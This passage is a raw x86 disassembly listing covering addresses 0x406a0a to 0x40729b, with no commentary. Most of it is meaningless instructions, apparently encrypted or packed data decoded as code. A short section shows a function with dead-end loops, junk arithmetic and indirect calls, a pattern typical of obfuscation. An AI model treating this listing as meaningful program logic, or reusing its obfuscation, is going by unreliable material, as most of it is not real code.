  406a0a:	imul   eax,DWORD PTR [ecx-0x53],0x64
  406a0e:	lods   al,BYTE PTR ds:[esi]
  406a0f:	sbb    ah,BYTE PTR [ebx]
  406a11:	in     al,0x23
  406a13:	jnp    0x4069fa
  406a15:	imul   esp,DWORD PTR [edx+0x20e07ee6],0x2bd05fb4
  406a1f:	repnz (bad) 
  406a21:	ficomp WORD PTR [edx+edx*2]
  406a24:	pusha  
  406a25:	push   edx
  406a26:	ret    
  406a27:	add    BYTE PTR [eax],al
  406a29:	pop    ebx
  406a2a:	mov    ah,0x2c
  406a2c:	(bad)  
  406a2d:	cli    
  406a2e:	and    al,0xe9
  406a30:	xor    ebp,edx
  406a32:	std    
  406a33:	(bad)
  406a36:	jae    0x406a33
  406a38:	je     0x406a0a
  406a3a:	push   es
  406a3b:	sbb    eax,0x12593cdc
  406a40:	call   0x62a6:0x620f20fe
  406a47:	jbe    0x406a18
  406a49:	ins    BYTE PTR es:[edi],dx
  406a4a:	push   esp
  406a4b:	mov    esi,0x7e4e1b39
  406a50:	and    eax,0xeeb6e1d5
  406a55:	test   eax,0x3c532ae2
  406a5a:	call   0x5509:0x9924a85b
  406a61:	cmp    DWORD PTR [esi+0x4c105872],0xffffffe1
  406a68:	sub    DWORD PTR [edx-0x8],edx
  406a6b:	mov    dl,0x7
  406a6d:	dec    ecx
  406a6e:	sbb    eax,0x5f9832d8
  406a73:	repz aas 
  406a75:	and    BYTE PTR [esi+0x4d0e2915],dl
  406a7b:	in     al,dx
  406a7c:	loopne 0x406a46
  406a7e:	jae    0x406a33
  406a80:	stos   DWORD PTR es:[edi],eax
  406a81:	cmc    
  406a82:	mov    dl,0xb1
  406a84:	push   0xae6ea70f
  406a89:	xor    edx,0xf1a80455
  406a8f:	xor    edx,esi
  406a91:	es leave 
  406a93:	fisttp DWORD PTR [edx]
  406a95:	sti    
  406a96:	xor    BYTE PTR [esi-0x14526063],ch
  406a9c:	pop    edi
  406a9d:	bound  edi,QWORD PTR [edx+0x1d]
  406aa0:	hlt    
  406aa1:	out    dx,eax
  406aa2:	stos   DWORD PTR es:[edi],eax
  406aa3:	xor    eax,0x39
  406aa6:	(bad)  
  406aa7:	sub    eax,0xbe47704b
  406aac:	into   
  406aad:	repz mov edi,0x23f45c00
  406ab3:	shl    DWORD PTR [edi],0x8a
  406ab6:	ret    
  406ab7:	std    
  406ab8:	icebp  
  406ab9:	sbb    eax,edx
  406abb:	int3   
  406abc:	pop    ecx
  406abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406abe:	adc    BYTE PTR [eax],0x33
  406ac1:	rol    DWORD PTR ds:0x32729c,0xc9
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e77b,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd81,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fd59
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e76f,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fd59
  406b20:	and    esi,DWORD PTR ds:0x42e1a8
  406b26:	mov    DWORD PTR ds:0x42fd59,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e773,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e773,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e773,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e35f
  406b61:	mov    edi,DWORD PTR ds:0x42e773
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e773,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fd71,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fd71,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fd71,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fd7d
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e5bf
  406bad:	mov    edi,DWORD PTR ds:0x42fd71
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fd71,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fd65,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fd65
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fd65,edi
  406bdb:	cmp    DWORD PTR ds:0x42fd65,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fd65,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fd6d
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e4db
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fdf6,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fdf6
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fdf6,edi
  406c22:	cmp    DWORD PTR ds:0x42fdf6,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e787
  406c34:	push   0x42e224
  406c39:	call   DWORD PTR ds:0x42e5c3
  406c3f:	cmp    DWORD PTR ds:0x42fdf6,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fdf6
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fdf6,edi
  406c59:	cmp    DWORD PTR ds:0x42fdf6,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e793,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e78b,0x42fdf6
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x61
  406c9b:	fwait
  406c9c:	es je  0x406cb6
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406d20
  406ca7:	rcl    bh,1
  406ca9:	loop   0x406ceb
  406cab:	jno    0x406c3e
  406cad:	lea    esp,[esi-0x25900ffd]
  406cb3:	xor    ebx,DWORD PTR [eax-0x10]
  406cb6:	dec    BYTE PTR [edi+0x3]
  406cb9:	adc    DWORD PTR [ebx-0x74],0xffffff85
  406cbd:	pusha  
  406cbe:	push   edi
  406cbf:	fisub  DWORD PTR [edx+0x70]
  406cc2:	xor    al,0xa6
  406cc4:	sahf   
  406cc5:	inc    ebp
  406cc6:	mov    ecx,0xfef58f35
  406ccb:	sbb    edx,ecx
  406ccd:	dec    edx
  406cce:	scas   al,BYTE PTR es:[edi]
  406ccf:	push   ds
  406cd0:	shr    ch,cl
  406cd2:	mov    dh,0xda
  406cd4:	xchg   ebp,eax
  406cd5:	cdq    
  406cd6:	adc    dh,bh
  406cd8:	mov    esi,DWORD PTR [ebp-0x24]
  406cdb:	icebp  
  406cdc:	mov    dh,0xbd
  406cde:	hlt    
  406cdf:	aad    0x5d
  406ce1:	retf   
  406ce2:	inc    ebx
  406ce3:	xor    edx,DWORD PTR [ebx-0x6dba1c56]
  406ce9:	int    0x45
  406ceb:	jle    0x406d66
  406ced:	les    edx,FWORD PTR [ebx+ebx*1]
  406cf0:	vsubpd ymm1,ymm4,ymm5
  406cf4:	scas   al,BYTE PTR es:[edi]
  406cf5:	(bad)  
  406cf6:	cmp    DWORD PTR [eax+0x681a709a],edx
  406cfc:	div    BYTE PTR [ebx+0x2455e589]
  406d02:	xor    ecx,esi
  406d04:	je     0x406d61
  406d06:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  406d08:	mov    ?,WORD PTR [ebx+0x7f]
  406d0b:	xchg   esp,eax
  406d0c:	xchg   esp,eax
  406d0d:	add    DWORD PTR [ebx+0x1fea9cb8],ebp
  406d13:	outs   dx,BYTE PTR ds:[esi]
  406d14:	(bad)  
  406d15:	hlt    
  406d16:	xor    ebp,DWORD PTR [ebx]
  406d18:	and    eax,0xc4ecff1b
  406d1d:	xor    ebx,edx
  406d1f:	xor    dh,BYTE PTR [edx-0x23c7b576]
  406d25:	jecxz  0x406cde
  406d27:	mov    edx,0xf74cb2ca
  406d2c:	mov    ebp,0xd9fc0876
  406d31:	pop    eax
  406d32:	push   ecx
  406d33:	daa    
  406d34:	jl     0xc3101a73
  406d3a:	jns    0x406d56
  406d3c:	stc    
  406d3d:	mov    al,ds:0xde2806d3
  406d42:	nop
  406d43:	out    0xe5,eax
  406d45:	and    al,0xfa
  406d47:	(bad)  
  406d48:	xor    eax,0x6fe30680
  406d4d:	dec    eax
  406d4e:	inc    edx
  406d4f:	pop    ebp
  406d50:	xor    cl,dl
  406d52:	loope  0x406daf
  406d54:	xchg   esi,eax
  406d55:	mov    DWORD PTR [esp+esi*8],esi
  406d58:	and    al,0xa7
  406d5a:	mov    esi,0xe492ac1c
  406d5f:	iret   
  406d60:	cmp    edi,ebp
  406d62:	in     eax,0xe0
  406d64:	push   ss
  406d65:	cli    
  406d66:	xchg   ebp,eax
  406d67:	mov    fs,eax
  406d69:	adc    cl,ah
  406d6b:	jbe    0x406dd9
  406d6d:	or     cl,BYTE PTR [ecx]
  406d6f:	and    BYTE PTR [ebp-0x32a8b27c],0x6d
  406d76:	xchg   BYTE PTR [ecx],ch
  406d78:	add    ebp,DWORD PTR [ebx-0x28]
  406d7b:	fsub   QWORD PTR [edx+0xd]
  406d7e:	imul   esi,DWORD PTR [edx+0xa6d9511],0x2c
  406d85:	pop    ebp
  406d86:	data16 xlat BYTE PTR ds:[ebx]
  406d88:	inc    esi
  406d89:	bswap  esp
  406d8b:	dec    ebp
  406d8c:	mov    ch,cl
  406d8e:	sbb    edx,DWORD PTR [edx-0x66]
  406d91:	ds xchg esp,eax
  406d93:	leave  
  406d94:	xlat   BYTE PTR ds:[ebx]
  406d95:	add    esp,DWORD PTR [ebp-0x5d]
  406d98:	call   0x5faa:0x93c252f3
  406d9f:	and    cl,BYTE PTR [ebp+0x72]
  406da2:	(bad)  
  406da3:	sar    BYTE PTR [eax],1
  406da5:	mov    al,ds:0xfe7b6c35
  406daa:	retf   
  406dab:	(bad)  
  406dac:	adc    bl,BYTE PTR [edx]
  406dae:	nop
  406daf:	sahf   
  406db0:	mov    al,0x9b
  406db2:	push   ss
  406db3:	out    dx,al
  406db4:	ss int3 
  406db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db7:	xchg   DWORD PTR [ebx+esi*2-0x46890c89],edx
  406dbe:	or     ch,BYTE PTR [eax+0x475d5c8f]
  406dc4:	ins    DWORD PTR es:[edi],dx
  406dc5:	fsubr  QWORD PTR [ebx+0x6378fcc1]
  406dcb:	sub    eax,0xabec846d
  406dd0:	aad    0x2c
  406dd2:	loopne 0x406d70
  406dd4:	mov    ebx,0xc692dcd5
  406dd9:	sub    al,0x8b
  406ddb:	(bad)  
  406ddc:	retf   0x6955
  406ddf:	outs   dx,BYTE PTR ds:[esi]
  406de0:	pusha  
  406de1:	dec    esp
  406de2:	pop    ds
  406de3:	xor    al,0xe6
  406de5:	nop
  406de6:	test   BYTE PTR [ebx-0x7c4faa03],bl
  406dec:	push   ss
  406ded:	and    BYTE PTR [ebx-0xd7b3e1b],dh
  406df3:	inc    ecx
  406df4:	std    
  406df5:	or     BYTE PTR [edi+0x13],cl
  406df8:	push   ebx
  406df9:	shrd   DWORD PTR [esi+0x3499ed7c],edi,0xc6
  406e01:	call   0x390d4ff6
  406e06:	and    BYTE PTR [ebx+0x4bde1c13],0xf3
  406e0d:	ja     0x406e60
  406e0f:	xlat   BYTE PTR ds:[ebx]
  406e10:	and    eax,0x4ce116ab
  406e15:	push   edx
  406e16:	sahf   
  406e17:	xor    edx,ecx
  406e19:	lds    esp,FWORD PTR [esi-0x5438c61b]
  406e1f:	push   eax
  406e20:	lea    esi,[edx-0x44]
  406e23:	or     al,dl
  406e25:	imul   eax,ebp,0xffffffa9
  406e28:	jp     0x406e04
  406e2a:	daa    
  406e2b:	test   DWORD PTR [esi+ecx*4],0xc592dfbc
  406e32:	add    eax,0x9246c0eb
  406e37:	jle    0x406e1c
  406e39:	adc    DWORD PTR [ecx+0xea616e4],esp
  406e3f:	mov    ebx,0x4942789
  406e44:	ficomp WORD PTR [edx-0x4c]
  406e47:	push   ds
  406e48:	cmp    eax,0x1708a9f0
  406e4d:	cmp    al,0xca
  406e4f:	aaa    
  406e50:	ror    BYTE PTR [ecx+eax*1],0x34
  406e54:	xor    esi,ebp
  406e56:	adc    esi,edx
  406e58:	into   
  406e59:	(bad)  
  406e5b:	pop    ebp
  406e5c:	inc    ecx
  406e5d:	imul   ebp,DWORD PTR [esi+0x54e9ff0],0x7486a83c
  406e67:	xchg   ebp,eax
  406e68:	push   ecx
  406e69:	call   0x3a20:0xa90756e9
  406e70:	mov    ah,0x84
  406e72:	mov    dl,0xa
  406e74:	mov    ebp,0x809c8793
  406e79:	mov    ecx,0x150a9e2f
  406e7e:	shr    edx,1
  406e80:	cli    
  406e81:	add    eax,0x16d3ddfd
  406e86:	imul   eax,DWORD PTR [esp+ecx*8],0x63ca4c79
  406e8d:	fsubrp st(7),st
  406e8f:	pop    eax
  406e90:	xchg   edx,eax
  406e91:	hlt    
  406e92:	ds popf 
  406e94:	outs   dx,BYTE PTR ds:[esi]
  406e95:	enter  0xe960,0x75
  406e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e9a:	popf   
  406e9b:	and    BYTE PTR [esi+0x19],ah
  406e9e:	sahf   
  406e9f:	jp     0x406e3a
  406ea1:	leave  
  406ea2:	fld    DWORD PTR [esi+0x129ec9d1]
  406ea8:	dec    eax
  406ea9:	mov    cl,0xaf
  406eab:	inc    esp
  406eac:	shr    BYTE PTR [esi+ebp*2-0x30ec8f17],cl
  406eb3:	shl    BYTE PTR [esi-0x1984eb7e],cl
  406eb9:	dec    ebx
  406eba:	push   esp
  406ebb:	add    bh,dl
  406ebd:	or     eax,DWORD PTR [ebx]
  406ebf:	sbb    BYTE PTR [ebp-0x6a],cl
  406ec2:	into   
  406ec3:	jns    0x406ebd
  406ec5:	popa   
  406ec6:	jge    0x406f45
  406ec8:	popa   
  406ec9:	pop    es
  406eca:	je     0x406f46
  406ecc:	inc    edi
  406ecd:	fsub   QWORD PTR [ebx-0x47a11046]
  406ed3:	arpl   bp,di
  406ed5:	mov    fs,WORD PTR [ecx]
  406ed7:	std    
  406ed8:	inc    eax
  406ed9:	xchg   BYTE PTR [eax+0x48129558],al
  406edf:	sub    eax,0x9d4d9c9f
  406ee4:	fisttp WORD PTR [esi+ebp*1]
  406ee7:	(bad)  
  406ee8:	daa    
  406ee9:	fsubr  st,st(7)
  406eeb:	sbb    al,0x11
  406eed:	(bad)  
  406eef:	inc    ebx
  406ef0:	pop    eax
  406ef1:	jge    0x406f49
  406ef3:	jecxz  0x406ebc
  406ef5:	repnz pop eax
  406ef7:	test   BYTE PTR es:[ebp+ebp*2-0x3d],bh
  406efc:	(bad)  
  406efd:	popf   
  406efe:	push   edx
  406eff:	add    DWORD PTR [edx-0x12111d8e],ebx
  406f05:	adc    ebx,eax
  406f07:	jl     0x406ec1
  406f09:	cmp    ecx,esi
  406f0b:	out    dx,al
  406f0c:	mov    ah,BYTE PTR [edi]
  406f0e:	mov    ss,WORD PTR [ebx]
  406f10:	test   esp,edi
  406f12:	ja     0x406f79
  406f14:	sub    BYTE PTR [eax-0x2574c46d],dh
  406f1a:	test   al,0x25
  406f1c:	sub    BYTE PTR [esi+0x23d2e6fc],bl
  406f22:	in     eax,dx
  406f23:	push   eax
  406f24:	aaa    
  406f25:	idiv   eax
  406f27:	jns    0x406f6a
  406f29:	pop    ecx
  406f2a:	(bad)  
  406f2b:	xor    esp,DWORD PTR [edx-0x5ee0d5e9]
  406f31:	jbe    0x406eee
  406f33:	push   ebp
  406f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f35:	in     al,0x8a
  406f37:	hlt    
  406f38:	loopne 0x406f58
  406f3a:	adc    BYTE PTR [eax+0x15],bl
  406f3d:	jmp    0xce48b38f
  406f42:	repz pop edi
  406f44:	pop    eax
  406f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f46:	and    dh,al
  406f48:	cmp    al,0x7a
  406f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4b:	jbe    0x406f88
  406f4d:	ins    DWORD PTR es:[edi],dx
  406f4e:	mov    bl,0x92
  406f50:	pushf  
  406f51:	push   ebx
  406f52:	imul   ecx,DWORD PTR [edx-0x59],0x7a
  406f56:	(bad)  
  406f57:	and    al,0xb9
  406f59:	int3   
  406f5a:	sbb    edx,DWORD PTR [edx+0x79]
  406f5d:	xor    al,BYTE PTR [ebp+0x24]
  406f60:	out    0xab,al
  406f62:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f64:	leave  
  406f65:	inc    ebx
  406f66:	mov    ss,esp
  406f68:	push   ss
  406f69:	cmc    
  406f6a:	and    esi,ecx
  406f6c:	cmp    ebx,eax
  406f6e:	push   ebp
  406f6f:	psubsb mm7,QWORD PTR [esi]
  406f72:	or     al,0x91
  406f74:	inc    ebp
  406f75:	call   0x5340:0x6d577c5d
  406f7c:	adc    ebx,DWORD PTR [ecx-0x72]
  406f7f:	jmp    0xe48d:0x90a3ec8a
  406f86:	cmp    bh,bh
  406f88:	(bad)
  406f8b:	outs   dx,DWORD PTR ds:[esi]
  406f8c:	aam    0x52
  406f8e:	pusha  
  406f8f:	xchg   ebp,eax
  406f90:	or     cl,ah
  406f92:	adc    DWORD PTR [esi+edi*4],ecx
  406f95:	ret    
  406f96:	(bad)  
  406f98:	daa    
  406f99:	(bad)  
  406f9a:	(bad)  
  406f9c:	stc    
  406f9d:	or     al,0x40
  406f9f:	xor    dl,BYTE PTR [esi]
  406fa1:	xor    ebp,DWORD PTR [eax]
  406fa3:	rcl    DWORD PTR [ebp-0x30d14c6a],0x22
  406faa:	jbe    0x407023
  406fac:	cwde   
  406fad:	sub    ebx,eax
  406faf:	and    DWORD PTR [ebx],0x6e
  406fb2:	imul   eax,eax,0x6d2cc610
  406fb8:	inc    edx
  406fb9:	pop    ds
  406fba:	mov    ebx,0x7175e7c0
  406fbf:	lock inc ecx
  406fc1:	fwait
  406fc2:	scas   al,BYTE PTR es:[edi]
  406fc3:	cwde   
  406fc4:	jb     0x406f4f
  406fc6:	dec    ecx
  406fc7:	jecxz  0x407020
  406fc9:	xor    edx,DWORD PTR fs:[esi]
  406fcc:	and    al,0x6f
  406fce:	repz rcr bl,0x79
  406fd2:	test   eax,0xc79baf25
  406fd7:	inc    ebp
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	repnz std 
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx-0x38ffbd19],cl
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   ax,ax
  40700c:	mov    dl,0xbf
  40700e:	icebp  
  40700f:	mov    edx,0x7d207070
  407015:	jo     0x407087
  407017:	pop    eax
  407018:	in     al,dx
  407019:	cmp    dl,BYTE PTR [ebx+0xc]
  40701c:	mov    ds:0x485f9215,al
  407021:	pop    edx
  407022:	lods   al,BYTE PTR ds:[esi]
  407023:	jecxz  0x406fe7
  407025:	test   al,0xb9
  407027:	or     al,ch
  407029:	fld    TBYTE PTR [esi]
  40702b:	jg     0x407022
  40702d:	inc    ebp
  40702e:	arpl   WORD PTR [ebp-0xc3d9ef6],bx
  407034:	sbb    DWORD PTR [esi-0x39],ecx
  407037:	inc    ecx
  407038:	pop    es
  407039:	lods   eax,DWORD PTR ds:[esi]
  40703a:	pop    ss
  40703b:	jo     0x407050
  40703d:	gs pop esp
  40703f:	jmp    0x681a313f
  407044:	loope  0x4070af
  407046:	pop    esi
  407047:	les    ebp,FWORD PTR [ebx-0x3a]
  40704a:	test   eax,0x62476321
  40704f:	sub    DWORD PTR [ebx-0x9],ebx
  407052:	test   eax,0x3ef31921
  407057:	xor    ebx,edx
  407059:	fisubr DWORD PTR [ebx-0x4c]
  40705c:	adc    esi,DWORD PTR [ebx+0x6a]
  40705f:	(bad)  
  407060:	in     al,0xb5
  407062:	push   0x5d35ce03
  407067:	or     edi,DWORD PTR [ebp-0x6c836ed5]
  40706d:	fcmovu st,st(4)
  40706f:	enter  0xf65a,0x51
  407073:	adc    eax,0x20c16e6e
  407078:	ins    BYTE PTR es:[edi],dx
  407079:	push   0x79
  40707b:	popf   
  40707c:	aaa    
  40707d:	loope  0x407026
  40707f:	cmp    DWORD PTR [ebx],0xcd37cdcc
  407085:	in     al,dx
  407086:	sub    DWORD PTR [ebx],0xcd1c4cb8
  40708c:	repnz int 0x87
  40708f:	xchg   esi,eax
  407090:	(bad)  
  407091:	lahf   
  407092:	aas    
  407093:	push   0x8
  407095:	push   esp
  407096:	xchg   edx,eax
  407097:	cld    
  407098:	pushf  
  407099:	arpl   WORD PTR [edx+esi*8],sp
  40709c:	mov    al,ds:0xdf558540
  4070a1:	sbb    DWORD PTR ds:0xbc1a3c83,eax
  4070a7:	sub    DWORD PTR [esp+ecx*1],0xad2aa66a
  4070ae:	scas   eax,DWORD PTR es:[edi]
  4070af:	add    al,0xa1
  4070b1:	enter  0x62b1,0xa4
  4070b5:	cmp    eax,0x7e5f8f8a
  4070ba:	pop    eax
  4070bb:	cmc    
  4070bc:	test   eax,0xd92d03ed
  4070c1:	(bad)  
  4070c2:	adc    esp,DWORD PTR [edi-0x38]
  4070c5:	or     al,BYTE PTR [edi]
  4070c7:	pop    es
  4070c8:	mov    ah,0x1e
  4070ca:	dec    edi
  4070cb:	test   DWORD PTR [edx],ecx
  4070cd:	int3   
  4070ce:	sub    ah,dl
  4070d0:	shr    BYTE PTR [ebx-0x59997d88],0xb9
  4070d7:	popa   
  4070d8:	cdq    
  4070d9:	ror    bh,1
  4070db:	add    eax,0x74d48fbe
  4070e0:	fisub  DWORD PTR [edx]
  4070e2:	xor    al,0x46
  4070e4:	test   BYTE PTR [edx+0x73],dh
  4070e7:	pop    eax
  4070e8:	cli    
  4070e9:	repnz pop ss
  4070eb:	xor    al,0x3
  4070ed:	cs aaa 
  4070ef:	pop    ecx
  4070f0:	loop   0x407129
  4070f2:	jmp    0x4070f1
  4070f4:	and    BYTE PTR [edx-0x3],0x6c
  4070f8:	or     bh,BYTE PTR [edx-0x73e0f63a]
  4070fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ff:	lods   eax,DWORD PTR ds:[esi]
  407100:	das    
  407101:	mov    edx,0xed21d823
  407106:	rol    DWORD PTR [ebx-0x23638f5c],cl
  40710c:	mov    al,0xde
  40710e:	xor    BYTE PTR [ebx+0x122c48d9],bh
  407114:	xchg   ebx,eax
  407115:	adc    al,0x61
  407117:	pop    es
  407118:	(bad)  
  407119:	xor    al,0xda
  40711b:	loope  0x4070a2
  40711d:	push   ecx
  40711e:	xchg   al,ah
  407120:	push   0xe1996a3c
  407125:	(bad)  
  407126:	in     al,0x47
  407128:	mov    esi,0x8c485618
  40712d:	mov    esp,0x2a54d135
  407132:	cmp    ecx,DWORD PTR [eax]
  407134:	mov    dl,0xdc
  407136:	jge    0x4070e2
  407138:	pop    ecx
  407139:	sub    esp,DWORD PTR ds:0x2d85357e
  40713f:	sub    bl,BYTE PTR [edi+0x6a527e02]
  407145:	xchg   esp,eax
  407146:	mov    al,0x0
  407148:	cmc    
  407149:	cmovae ebp,DWORD PTR [eax+0x7bcd1376]
  407150:	push   0xffffffc0
  407152:	or     al,bh
  407154:	repnz mov edx,0xd06cb808
  40715a:	pop    eax
  40715b:	push   0xde438925
  407160:	push   eax
  407161:	fisubr WORD PTR [eax+0x154abe1b]
  407167:	push   ss
  407168:	loopne 0x4071c4
  40716a:	bound  edi,QWORD PTR [edx]
  40716c:	lods   al,BYTE PTR ds:[esi]
  40716d:	(bad)  [edx-0x49]
  407170:	(bad)  [esi+0x39842b05]
  407176:	push   0x4b
  407178:	jl     0x407151
  40717a:	inc    edx
  40717b:	xchg   BYTE PTR [esp+edx*2-0x1],al
  40717f:	in     al,0x63
  407181:	cmp    eax,0xd22a5b36
  407186:	ret    
  407187:	inc    eax
  407188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407189:	test   eax,0x489f4bd1
  40718e:	dec    esp
  40718f:	data16 or dh,bh
  407192:	das    
  407193:	test   DWORD PTR [ebx+ebp*1],ebp
  407196:	mov    bh,0x81
  407198:	sbb    al,0x23
  40719a:	pop    ecx
  40719b:	xchg   ecx,eax
  40719c:	inc    ebp
  40719d:	jo     0x4071bb
  40719f:	push   ebx
  4071a0:	test   DWORD PTR [edx-0x34],ebx
  4071a3:	outs   dx,BYTE PTR ds:[esi]
  4071a4:	out    0xc4,eax
  4071a6:	xor    DWORD PTR [esi],ecx
  4071a8:	retf   0xad7e
  4071ab:	xor    bh,bh
  4071ad:	lea    esi,[edx]
  4071af:	call   0x65ba:0x5c1107e8
  4071b6:	fcomp  QWORD PTR [esi]
  4071b8:	mov    ds:0xbc844b8d,eax
  4071bd:	outs   dx,BYTE PTR ds:[esi]
  4071be:	test   al,0x16
  4071c0:	sbb    al,0xc2
  4071c2:	loop   0x407150
  4071c4:	inc    edx
  4071c5:	dec    ebp
  4071c6:	inc    esp
  4071c7:	cmp    eax,0x9784f8e3
  4071cc:	aaa    
  4071cd:	add    eax,0x7954b1cb
  4071d2:	or     eax,0xd7307d22
  4071d7:	rcr    ch,cl
  4071d9:	mov    ch,0x70
  4071db:	jmp    0x170e:0xdafcecb4
  4071e2:	hlt    
  4071e3:	sbb    al,0x1d
  4071e5:	mov    ch,0x5
  4071e7:	int    0xa4
  4071e9:	mov    ds:0x514166b4,eax
  4071ee:	lea    esi,[esi+0x7edfb933]
  4071f4:	xchg   edi,eax
  4071f5:	arpl   WORD PTR [eax+0x7d571556],bx
  4071fb:	push   ebx
  4071fc:	xor    BYTE PTR [esp+ebx*8-0x26fb0da0],al
  407203:	pusha  
  407204:	pushf  
  407205:	xchg   edi,eax
  407206:	daa    
  407207:	arpl   ax,ax
  407209:	lea    ebp,[edi]
  40720b:	jbe    0x40722d
  40720d:	pop    esi
  40720e:	sub    DWORD PTR [eax+ebx*4-0x61793768],esp
  407215:	sbb    ecx,DWORD PTR [edx]
  407217:	rol    WORD PTR [edx-0x52],0x14
  40721c:	mov    cl,0xa8
  40721e:	xor    DWORD PTR [edi+0x4c],esi
  407221:	sbb    esp,DWORD PTR [ecx]
  407223:	jb     0x407232
  407225:	or     DWORD PTR [ecx+0x158c3274],ebp
  40722b:	sbb    bh,BYTE PTR [eax]
  40722d:	xchg   BYTE PTR [ebx+0x162d6321],bh
  407233:	xor    edx,0x9a29bec2
  407239:	(bad)  
  40723a:	mov    ah,0x68
  40723c:	sbb    al,0xc2
  40723e:	add    al,0xa2
  407240:	dec    eax
  407241:	and    DWORD PTR [ecx-0x50e4935a],0xffffffb2
  407248:	pushf  
  407249:	aad    0xf7
  40724b:	sub    eax,0xe467a0e6
  407250:	sub    ebx,0x3c97bd16
  407256:	aaa    
  407257:	fadd   QWORD PTR [esi-0x4c]
  40725a:	jns    0x4072a8
  40725c:	inc    esp
  40725d:	or     ebp,ebx
  40725f:	cld    
  407260:	pop    esp
  407261:	inc    esp
  407262:	fcomi  st,st(4)
  407264:	sub    BYTE PTR [ecx+eax*2-0x33],bl
  407268:	and    esp,ebp
  40726a:	dec    eax
  40726b:	popa   
  40726c:	push   ss
  40726d:	(bad)  
  40726e:	inc    edx
  40726f:	jno    0x40728c
  407271:	cmovge ebx,DWORD PTR [edi+0x59258e7b]
  407278:	(bad)  
  407279:	cmp    al,0x9e
  40727b:	cmp    al,0x2c
  40727d:	xchg   esi,eax
  40727e:	or     eax,0x644efa13
  407283:	dec    esp
  407284:	mov    dl,0x17
  407286:	xadd   DWORD PTR [ebp+0x40],eax
  40728a:	test   DWORD PTR [edx-0x31],eax
  40728d:	imul   esp,ebp,0x72
  407290:	inc    ecx
  407291:	and    ah,bh
  407293:	dec    ebx
  407294:	out    0x6d,al
  407296:	jmp    0x8ddc2763
  40729b:	mov    esi,0x8e22430e
